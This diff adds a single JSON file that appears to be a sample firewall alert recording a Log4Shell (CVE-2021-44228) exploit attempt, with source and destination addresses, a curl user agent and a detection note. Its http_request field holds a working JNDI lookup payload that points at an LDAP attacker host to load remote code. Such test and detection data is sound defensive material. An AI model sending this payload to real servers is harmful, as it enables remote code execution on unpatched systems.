@@ -1,0 +1,15 @@
+{
+    "event_id": "EVT-123456",
+    "source": "Firewall-PaloAlto",
+    "timestamp": "2026-03-23T21:56:00Z",
+    "event_type": "Exploit Attempt",
+    "severity": "CRITICAL",
+    "payload": {
+        "src_ip": "198.51.100.42",
+        "dest_ip": "10.0.0.15",
+        "dest_port": 8080,
+        "http_request": "GET /?x=${jndi:ldap://198.51.100.42/Exploit} HTTP/1.1",
+        "user_agent": "curl/7.68.0",
+        "note": "Possible CVE-2021-44228 exploitation attempt detected"
+    }
+}
